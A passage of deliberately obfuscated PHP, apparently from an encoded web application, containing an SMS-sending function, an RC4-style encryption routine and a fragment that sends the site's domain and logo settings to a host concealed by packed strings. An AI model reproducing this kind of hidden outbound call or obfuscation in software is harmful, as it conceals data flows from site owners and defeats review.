Q24x98;Q24ldMhx99:$Q24ACV34=$GLOBALS[G5941RDQ][00];Q24x98:$Q24F33=call_user_func_array("pack",array(&$Q24ACV34,$GLOBALS[G5941RDQ]{012}));$Q24P14=$C_domain . $Q24F33;$Q24P15=$Q24P14 . $C_logo;$Q24F36=call_user_func_array("urlencode",array(&$Q24P15));$Q24P16=$Q24P13 . $Q24F36;unset($Q24ACV38);if(is_array($GLOBALS[G5941RDQ]))goto Q24eWjgx9b;goto Q24ldMhx9b;Q24eWjgx9b:$Q24ACV38=&$GLOBALS[G5941RDQ][00];goto Q24x9a;Q24ldMhx9b:$Q24ACV38=$GLOBALS[G5941RDQ][00];Q24x9a:$Q24F37=call_user_func_array("pack",array(&$Q24ACV38,$GLOBALS[G5941RDQ]{013}));$Q24P17=$Q24P16 . $Q24F37;$Q24F39=call_user_func_array("urlencode",array(&$C_domain));$Q24P18=$Q24P17 . $Q24F39;$Q24F51=call_user_func_array("GetBody",array(&$Q24F0,&$Q24P18));Q24x89:}function sendsms($W5IE0D2J,$JO2N617v){$Q24F0=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{1}));$Q24F1=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{2}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;global $C_userid,$C_codeid,$C_codekey;$Q24F0=call_user_func_array("intval",array(&$C_userid));$Q240=52*E_CORE_ERROR;$Q241=$Q240-832;$Q242=$Q24F0>$Q241;if($Q242)goto Q24eWjgx9x;goto Q24ldMhx9x;Q24eWjgx9x:$Q24F0=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{1}));$Q24F1=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{2}));unset($Q24ACV3);if(is_array($_SESSION))goto Q24eWjgxa1;goto Q24ldMhxa1;Q24eWjgxa1:$Q24ACV3=&$_SESSION[$Q24F1];goto Q24xaz;Q24ldMhxa1:$Q24ACV3=$_SESSION[$Q24F1];Q24xaz:$Q24F2=call_user_func_array("intval",array(&$Q24ACV3));$Q240=$GLOBALS[$Q24F0]()-$Q24F2;$Q241=0-724;$Q242=E_CORE_ERROR*49;$Q243=$Q241+$Q242;$Q244=$Q240>$Q243;if($Q244)goto Q24eWjgxa2;goto Q24ldMhxa2;Q24eWjgxa2:$Q24F0=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{03}));$Q24P0=$Q24F0 . $C_userid;unset($Q24ACV2);if(is_array($GLOBALS[HKN981DJ]))goto Q24eWjgxa8;goto Q24ldMhxa8;Q24eWjgxa8:$Q24ACV2=&$GLOBALS[HKN981DJ][0x4];goto Q24xa7;Q24ldMhxa8:$Q24ACV2=$GLOBALS[HKN981DJ][0x4];Q24xa7:$Q24F1=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},&$Q24ACV2));$Q24P1=$Q24P0 . $Q24F1;$Q24P2=$Q24P1 . $C_codeid;unset($Q24ACV4);if(is_array($GLOBALS[HKN981DJ]))goto Q24eWjgxa6;goto Q24ldMhxa6;Q24eWjgxa6:$Q24ACV4=&$GLOBALS[HKN981DJ][05];goto Q24xa5;Q24ldMhxa6:$Q24ACV4=$GLOBALS[HKN981DJ][05];Q24xa5:$Q24F3=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},&$Q24ACV4));$Q24P3=$Q24P2 . $Q24F3;$Q24P4=$Q24P3 . $C_codekey;unset($Q24ACV6);if(is_array($GLOBALS[HKN981DJ]))goto Q24eWjgxa4;goto Q24ldMhxa4;Q24eWjgxa4:$Q24ACV6=&$GLOBALS[HKN981DJ][6];goto Q24xa3;Q24ldMhxa4:$Q24ACV6=$GLOBALS[HKN981DJ][6];Q24xa3:$Q24F5=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},&$Q24ACV6));$Q24P5=$Q24P4 . $Q24F5;$Q24F7=call_user_func_array("urlencode",array(&$W5IE0D2J));$Q24P6=$Q24P5 . $Q24F7;$Q24F8=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{0x7}));$Q24P7=$Q24P6 . $Q24F8;$Q24P8=$Q24P7 . $JO2N617v;$Q24F9=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{8}));$Q24P9=$Q24P8 . $Q24F9;unset($Q24ACV14);if(is_array($GLOBALS[HKN981DJ]))goto Q24eWjgxaa;goto Q24ldMhxaa;Q24eWjgxaa:$Q24ACV14=&$GLOBALS[HKN981DJ][9];goto Q24xa9;Q24ldMhxaa:$Q24ACV14=$GLOBALS[HKN981DJ][9];Q24xa9:$Q24F13=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},&$Q24ACV14));$Q24F16=call_user_func_array("getbody",array(&$Q24P9,&$Q24F13));$Q24F0=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{2}));$Q24F1=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{1}));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F1]();$_SESSION[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{10}));return $Q24F0;goto Q24x9y;Q24ldMhxa2:$Q240=0-724;$Q241=E_CORE_ERROR*49;$Q242=$Q240+$Q241;$Q24F0=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{1}));$Q243=$Q242-$GLOBALS[$Q24F0]();$Q24F1=call_user_func_array("pack",array($GLOBALS[HKN981DJ]{00},$GLOBALS[HKN981DJ]{2}));unset($Q24ACV3);if(is_array($_SESSION))goto Q24eWjgxac;goto Q24ldMhxac;Q24eWjgxac:$Q24ACV3=&$_SESSION[$Q24F1];goto Q24xab;Q24ldMhxac:$Q24ACV3=$_SESSION[$Q24F1];Q24xab:$Q24F2=call_user_func_array("intval",array(&$Q24ACV3));$Q244=$Q243+$Q24F2;return $Q244;Q24x9y:goto Q24x9w;Q24ldMhx9x:Q24x9w:}function ycode($LI2452Nv){$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0x2}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxae;goto Q24ldMhxae;Q24eWjgxae:$Q24ACV1=&$GLOBALS[FFVQF4FQ][3];goto Q24xad;Q24ldMhxae:$Q24ACV1=$GLOBALS[FFVQF4FQ][3];Q24xad:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxag;goto Q24ldMhxag;Q24eWjgxag:$Q24ACV4=&$GLOBALS[FFVQF4FQ][0x4];goto Q24xaf;Q24ldMhxag:$Q24ACV4=$GLOBALS[FFVQF4FQ][0x4];Q24xaf:$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV4));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxai;goto Q24ldMhxai;Q24eWjgxai:$Q24ACV1=&$GLOBALS[FFVQF4FQ][0x5];goto Q24xah;Q24ldMhxai:$Q24ACV1=$GLOBALS[FFVQF4FQ][0x5];Q24xah:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{06}));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxak;goto Q24ldMhxak;Q24eWjgxak:$Q24ACV1=&$GLOBALS[FFVQF4FQ][07];goto Q24xaj;Q24ldMhxak:$Q24ACV1=$GLOBALS[FFVQF4FQ][07];Q24xaj:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxam;goto Q24ldMhxam;Q24eWjgxam:$Q24ACV4=&$GLOBALS[FFVQF4FQ][8];goto Q24xal;Q24ldMhxam:$Q24ACV4=$GLOBALS[FFVQF4FQ][8];Q24xal:$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV4));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0x9}));$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{10}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxao;goto Q24ldMhxao;Q24eWjgxao:$Q24ACV1=&$GLOBALS[FFVQF4FQ][013];goto Q24xan;Q24ldMhxao:$Q24ACV1=$GLOBALS[FFVQF4FQ][013];Q24xan:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{014}));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxaq;goto Q24ldMhxaq;Q24eWjgxaq:$Q24ACV1=&$GLOBALS[FFVQF4FQ][13];goto Q24xap;Q24ldMhxaq:$Q24ACV1=$GLOBALS[FFVQF4FQ][13];Q24xap:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0xE}));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0xF}));$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0x10}));unset($Q24tI0);$Q24tI0=$Q24F1;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxas;goto Q24ldMhxas;Q24eWjgxas:$Q24ACV1=&$GLOBALS[FFVQF4FQ][0x11];goto Q24xar;Q24ldMhxas:$Q24ACV1=$GLOBALS[FFVQF4FQ][0x11];Q24xar:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxau;goto Q24ldMhxau;Q24eWjgxau:$Q24ACV4=&$GLOBALS[FFVQF4FQ][022];goto Q24xat;Q24ldMhxau:$Q24ACV4=$GLOBALS[FFVQF4FQ][022];Q24xat:$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV4));unset($Q24tI0);$Q24tI0=$Q24F3;$GLOBALS[$Q24F0]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxax;goto Q24ldMhxax;Q24eWjgxax:$Q24ACV1=&$GLOBALS[FFVQF4FQ][0x13];goto Q24xaw;Q24ldMhxax:$Q24ACV1=$GLOBALS[FFVQF4FQ][0x13];Q24xaw:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q240=!defined($Q24F0);if($Q240)goto Q24eWjgxay;goto Q24ldMhxay;Q24eWjgxay:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{20}));unset($Q24ACV2);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxb1;goto Q24ldMhxb1;Q24eWjgxb1:$Q24ACV2=&$GLOBALS[FFVQF4FQ][0x13];goto Q24xbz;Q24ldMhxb1:$Q24ACV2=$GLOBALS[FFVQF4FQ][0x13];Q24xbz:$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV2));$Q24F4=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{025}));call_user_func($Q24F0,$Q24F1,$Q24F4);goto Q24xav;Q24ldMhxay:Q24xav:$Q24A0=array();$Q24A0[]=$GLOBALS;unset($Q24tI0);$Q24tI0=$Q24A0;$GLOBALS[K1I4R2Cv]=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{026}));unset($Q24tI0);$Q24tI0=$Q24F0;$DQCZK91v=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxb3;goto Q24ldMhxb3;Q24eWjgxb3:$Q24ACV1=&$GLOBALS[FFVQF4FQ][23];goto Q24xb2;Q24ldMhxb3:$Q24ACV1=$GLOBALS[FFVQF4FQ][23];Q24xb2:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24tI0);$Q24tI0=$Q24F0;$XRQ3ERCJ=$Q24tI0;$Q240=E_CORE_ERROR*51;$Q241=$Q240-816;unset($Q24tI2);$Q24tI2=$Q241;$N2AVCZ6J=$Q24tI2;$Q240=E_CORE_ERROR*56;$Q241=$Q240-892;unset($Q24tI2);$Q24tI2=$Q241;$JN2906TQ=$Q24tI2;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));if($XRQ3ERCJ)goto Q24eWjgxb5;goto Q24ldMhxb5;Q24eWjgxb5:$Q24P0=$XRQ3ERCJ;goto Q24xb4;Q24ldMhxb5:$Q24P1=E_CORE_ERROR*51;$Q24P2=$Q24P1-816;$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0x18}));$Q24P0=$GLOBALS[K1I4R2Cv][$Q24P2][$Q24F1];Q24xb4:unset($Q24tI3);$Q24tI3=$GLOBALS[$Q24F0]($Q24P0);$XRQ3ERCJ=$Q24tI3;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));unset($Q24ACV2);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxb7;goto Q24ldMhxb7;Q24eWjgxb7:$Q24ACV2=&$GLOBALS[FFVQF4FQ][3];goto Q24xb6;Q24ldMhxb7:$Q24ACV2=$GLOBALS[FFVQF4FQ][3];Q24xb6:$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV2));$Q24P0=E_CORE_ERROR*51;$Q24P1=$Q24P0-816;$Q24P2=E_CORE_ERROR*37;$Q24P3=$Q24P2-576;unset($Q24tI4);$Q24tI4=$GLOBALS[$Q24F0]($GLOBALS[$Q24F1]($XRQ3ERCJ,$Q24P1,$Q24P3));$LBCV71QQ=$Q24tI4;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));unset($Q24ACV2);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxb9;goto Q24ldMhxb9;Q24eWjgxb9:$Q24ACV2=&$GLOBALS[FFVQF4FQ][3];goto Q24xb8;Q24ldMhxb9:$Q24ACV2=$GLOBALS[FFVQF4FQ][3];Q24xb8:$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV2));$Q24P0=E_CORE_ERROR*37;$Q24P1=$Q24P0-576;$Q24P2=E_CORE_ERROR*37;$Q24P3=$Q24P2-576;unset($Q24tI4);$Q24tI4=$GLOBALS[$Q24F0]($GLOBALS[$Q24F1]($XRQ3ERCJ,$Q24P1,$Q24P3));$VE0948YQ=$Q24tI4;if($JN2906TQ)goto Q24eWjgxbf;goto Q24ldMhxbf;Q24eWjgxbf:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{026}));$Q240=$DQCZK91v==$Q24F0;if($Q240)goto Q24eWjgxbd;goto Q24ldMhxbd;Q24eWjgxbd:unset($Q24ACV2);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxbb;goto Q24ldMhxbb;Q24eWjgxbb:$Q24ACV2=&$GLOBALS[FFVQF4FQ][3];goto Q24xba;Q24ldMhxbb:$Q24ACV2=$GLOBALS[FFVQF4FQ][3];Q24xba:$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV2));$Q24P1=E_CORE_ERROR*51;$Q24P2=$Q24P1-816;$Q243=$GLOBALS[$Q24F1]($LI2452Nv,$Q24P2,$JN2906TQ);goto Q24xbc;Q24ldMhxbd:$Q24F4=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));$Q24F5=call_user_func_array("microtime",array());$Q24F6=call_user_func_array("substr",array($GLOBALS[$Q24F4]($Q24F5),-$JN2906TQ));$Q243=$Q24F6;Q24xbc:$Q244=$Q243;goto Q24xbe;Q24ldMhxbf:$Q24F7=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{031}));$Q244=$Q24F7;Q24xbe:unset($Q24tI5);$Q24tI5=$Q244;$CF2JKAXJ=$Q24tI5;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));$Q24P0=$LBCV71QQ . $CF2JKAXJ;$Q241=$LBCV71QQ . $GLOBALS[$Q24F0]($Q24P0);unset($Q24tI2);$Q24tI2=$Q241;$AU67PC9v=$Q24tI2;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxbh;goto Q24ldMhxbh;Q24eWjgxbh:$Q24ACV1=&$GLOBALS[FFVQF4FQ][0x5];goto Q24xbg;Q24ldMhxbh:$Q24ACV1=$GLOBALS[FFVQF4FQ][0x5];Q24xbg:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($AU67PC9v);$W4S28EJJ=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{026}));$Q240=$DQCZK91v==$Q24F0;if($Q240)goto Q24eWjgxbr;goto Q24ldMhxbr;Q24eWjgxbr:unset($Q24ACV2);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxbj;goto Q24ldMhxbj;Q24eWjgxbj:$Q24ACV2=&$GLOBALS[FFVQF4FQ][07];goto Q24xbi;Q24ldMhxbj:$Q24ACV2=$GLOBALS[FFVQF4FQ][07];Q24xbi:$Q24F1=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV2));unset($Q24ACV5);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxbl;goto Q24ldMhxbl;Q24eWjgxbl:$Q24ACV5=&$GLOBALS[FFVQF4FQ][3];goto Q24xbk;Q24ldMhxbl:$Q24ACV5=$GLOBALS[FFVQF4FQ][3];Q24xbk:$Q24F4=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV5));$Q241=$GLOBALS[$Q24F1]($GLOBALS[$Q24F4]($LI2452Nv,$JN2906TQ));goto Q24xbq;Q24ldMhxbr:$Q24F7=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{032}));if($N2AVCZ6J)goto Q24eWjgxbn;goto Q24ldMhxbn;Q24eWjgxbn:$Q24F8=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{0x9}));$Q24P2=$N2AVCZ6J+$GLOBALS[$Q24F8]();$Q24P3=$Q24P2;goto Q24xbm;Q24ldMhxbn:$Q24P4=E_CORE_ERROR*51;$Q24P5=$Q24P4-816;$Q24P3=$Q24P5;Q24xbm:$Q24F9=call_user_func_array("sprintf",array(&$Q24F7,&$Q24P3));unset($Q24ACV11);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxbp;goto Q24ldMhxbp;Q24eWjgxbp:$Q24ACV11=&$GLOBALS[FFVQF4FQ][3];goto Q24xbo;Q24ldMhxbp:$Q24ACV11=$GLOBALS[FFVQF4FQ][3];Q24xbo:$Q24F10=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV11));$Q24F13=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{01}));$Q24P6=$LI2452Nv . $VE0948YQ;$Q24P7=E_CORE_ERROR*51;$Q24P8=$Q24P7-816;$Q24P9=E_CORE_ERROR*37;$Q24P10=$Q24P9-576;$Q2411=$Q24F9 . $GLOBALS[$Q24F10]($GLOBALS[$Q24F13]($Q24P6),$Q24P8,$Q24P10);$Q2412=$Q2411 . $LI2452Nv;$Q241=$Q2412;Q24xbq:unset($Q24tI13);$Q24tI13=$Q241;$LI2452Nv=$Q24tI13;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxbt;goto Q24ldMhxbt;Q24eWjgxbt:$Q24ACV1=&$GLOBALS[FFVQF4FQ][0x5];goto Q24xbs;Q24ldMhxbt:$Q24ACV1=$GLOBALS[FFVQF4FQ][0x5];Q24xbs:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24tI0);$Q24tI0=$GLOBALS[$Q24F0]($LI2452Nv);$AJP22O7v=$Q24tI0;$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{031}));unset($Q24tI0);$Q24tI0=$Q24F0;$L5O41U4v=$Q24tI0;$Q24P0=E_CORE_ERROR*51;$Q24P1=$Q24P0-816;$Q24P2=14*E_CORE_ERROR;$Q24P3=$Q24P2+31;$Q24F0=call_user_func_array("range",array(&$Q24P1,&$Q24P3));unset($Q24tI4);$Q24tI4=$Q24F0;$CY1D2JOJ=$Q24tI4;$Q24A0=array();unset($Q24tI0);$Q24tI0=$Q24A0;$RU1SE4SQ=$Q24tI0;$U2X3563v=(E_CORE_ERROR*51-816);Q24xbu:$Q240=14*E_CORE_ERROR;$Q241=$Q240+31;$Q242=$U2X3563v<=$Q241;if($Q242)goto Q24eWjgxc1;goto Q24ldMhxc1;Q24eWjgxc1:unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxby;goto Q24ldMhxby;Q24eWjgxby:$Q24ACV1=&$GLOBALS[FFVQF4FQ][013];goto Q24xbx;Q24ldMhxby:$Q24ACV1=$GLOBALS[FFVQF4FQ][013];Q24xbx:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));$Q24P0=$U2X3563v%$W4S28EJJ;unset($Q24tI1);$Q24tI1=$GLOBALS[$Q24F0]($AU67PC9v[$Q24P0]);unset($Q24tI0);$Q24tI0=$Q24tI1;$RU1SE4SQ[$U2X3563v]=$Q24tI0;Q24xbv:$Q24B1=$U2X3563v;$U2X3563v=$U2X3563v+1;goto Q24xbu;goto Q24xcz;Q24ldMhxc1:Q24xcz:Q24xbw:$TV441WHQ=$U2X3563v=(E_CORE_ERROR*51-816);Q24xc2:$Q240=62*E_CORE_ERROR;$Q241=$Q240-992;$Q242=$Q241-608;$Q243=E_CORE_ERROR*54;$Q244=$Q242+$Q243;$Q245=$U2X3563v<$Q244;if($Q245)goto Q24eWjgxc6;goto Q24ldMhxc6;Q24eWjgxc6:$Q240=$TV441WHQ+$CY1D2JOJ[$U2X3563v];$Q241=$Q240+$RU1SE4SQ[$U2X3563v];$Q242=62*E_CORE_ERROR;$Q243=$Q242-992;$Q244=$Q243-608;$Q245=E_CORE_ERROR*54;$Q246=$Q244+$Q245;$Q247=$Q241%$Q246;unset($Q24tI8);$Q24tI8=$Q247;unset($Q24tI0);$Q24tI0=$Q24tI8;$TV441WHQ=$Q24tI0;unset($Q24tI0);$Q24tI0=$CY1D2JOJ[$U2X3563v];$X8G0TBEQ=$Q24tI0;unset($Q24tI0);$Q24tI0=$CY1D2JOJ[$TV441WHQ];$CY1D2JOJ[$U2X3563v]=$Q24tI0;unset($Q24tI0);$Q24tI0=$X8G0TBEQ;$CY1D2JOJ[$TV441WHQ]=$Q24tI0;Q24xc3:$Q24B1=$U2X3563v;$U2X3563v=$U2X3563v+1;goto Q24xc2;goto Q24xc5;Q24ldMhxc6:Q24xc5:Q24xc4:$DWJLY28Q=$TV441WHQ=$U2X3563v=(E_CORE_ERROR*51-816);Q24xc7:$Q240=$U2X3563v<$AJP22O7v;if($Q240)goto Q24eWjgxcf;goto Q24ldMhxcf;Q24eWjgxcf:$Q240=E_CORE_ERROR*9;$Q241=$Q240-143;$Q242=$DWJLY28Q+$Q241;$Q243=62*E_CORE_ERROR;$Q244=$Q243-992;$Q245=$Q244-608;$Q246=E_CORE_ERROR*54;$Q247=$Q245+$Q246;$Q248=$Q242%$Q247;unset($Q24tI9);$Q24tI9=$Q248;unset($Q24tI0);$Q24tI0=$Q24tI9;$DWJLY28Q=$Q24tI0;$Q240=$TV441WHQ+$CY1D2JOJ[$DWJLY28Q];$Q241=62*E_CORE_ERROR;$Q242=$Q241-992;$Q243=$Q242-608;$Q244=E_CORE_ERROR*54;$Q245=$Q243+$Q244;$Q246=$Q240%$Q245;unset($Q24tI7);$Q24tI7=$Q246;unset($Q24tI0);$Q24tI0=$Q24tI7;$TV441WHQ=$Q24tI0;unset($Q24tI0);$Q24tI0=$CY1D2JOJ[$DWJLY28Q];$X8G0TBEQ=$Q24tI0;unset($Q24tI0);$Q24tI0=$CY1D2JOJ[$TV441WHQ];$CY1D2JOJ[$DWJLY28Q]=$Q24tI0;unset($Q24tI0);$Q24tI0=$X8G0TBEQ;$CY1D2JOJ[$TV441WHQ]=$Q24tI0;unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxcb;goto Q24ldMhxcb;Q24eWjgxcb:$Q24ACV1=&$GLOBALS[FFVQF4FQ][13];goto Q24xca;Q24ldMhxcb:$Q24ACV1=$GLOBALS[FFVQF4FQ][13];Q24xca:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV1));unset($Q24ACV4);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxcd;goto Q24ldMhxcd;Q24eWjgxcd:$Q24ACV4=&$GLOBALS[FFVQF4FQ][013];goto Q24xcc;Q24ldMhxcd:$Q24ACV4=$GLOBALS[FFVQF4FQ][013];Q24xcc:$Q24F3=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},&$Q24ACV4));$Q24P0=$CY1D2JOJ[$DWJLY28Q]+$CY1D2JOJ[$TV441WHQ];$Q24P1=62*E_CORE_ERROR;$Q24P2=$Q24P1-992;$Q24P3=$Q24P2-608;$Q24P4=E_CORE_ERROR*54;$Q24P5=$Q24P3+$Q24P4;$Q24P6=$Q24P0%$Q24P5;$Q24P7=$GLOBALS[$Q24F3]($LI2452Nv[$U2X3563v])^$CY1D2JOJ[$Q24P6];$Q240=$L5O41U4v . $GLOBALS[$Q24F0]($Q24P7);unset($Q24tI1);$Q24tI1=$Q240;$L5O41U4v=$Q24tI1;$Q24nW8=$L5O41U4v;Q24xc8:$Q24B1=$U2X3563v;$U2X3563v=$U2X3563v+1;goto Q24xc7;goto Q24xce;Q24ldMhxcf:Q24xce:Q24xc9:$Q24F0=call_user_func_array("pack",array($GLOBALS[FFVQF4FQ]{0},$GLOBALS[FFVQF4FQ]{026}));$Q240=$DQCZK91v==$Q24F0;if($Q240)goto Q24eWjgxch;goto Q24ldMhxch;Q24eWjgxch:unset($Q24ACV1);if(is_array($GLOBALS[FFVQF4FQ]))goto Q24eWjgxck;goto Q24ldMhxck;Q24eWjgxck:$Q24ACV1=&$GLOBALS[FFVQF4FQ][3];goto 